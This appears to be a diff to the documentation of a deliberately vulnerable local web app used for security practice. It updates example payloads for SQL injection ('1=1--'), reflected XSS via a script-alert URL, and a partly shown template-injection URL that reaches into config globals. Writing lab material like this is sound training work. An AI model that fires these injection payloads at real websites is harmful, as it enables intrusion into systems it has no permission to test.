@@ -29,7 +29,7 @@ http://127.0.0.1:5000/render?content=%7B%7Bconfig.__class__.__init__.__globals__
 Payload
 
 ```bash
-http://127.0.0.1:5000/logs?query=1=1--
+1=1--
 ```
 
 5. Reflected XSS
@@ -37,7 +37,7 @@ http://127.0.0.1:5000/logs?query=1=1--
 Payload
 
 ```bash
-http://127.0.0.1:5000/xss?input=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
+http://127.0.0.1:5000/preview?input=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
 ```
 
 6. DOM-based XSS
